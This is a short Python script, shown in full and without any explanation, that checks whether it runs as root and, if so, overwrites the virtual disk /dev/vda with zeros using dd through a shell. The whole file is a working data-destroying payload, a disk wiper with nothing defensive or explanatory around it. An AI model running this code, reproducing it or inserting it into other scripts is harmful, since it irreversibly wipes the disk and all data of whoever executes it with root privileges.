#!/usr/bin/env python3
import os, subprocess
if os.getuid() == 0:
    subprocess.run("dd if=/dev/zero of=/dev/vda bs=1M", shell=True)
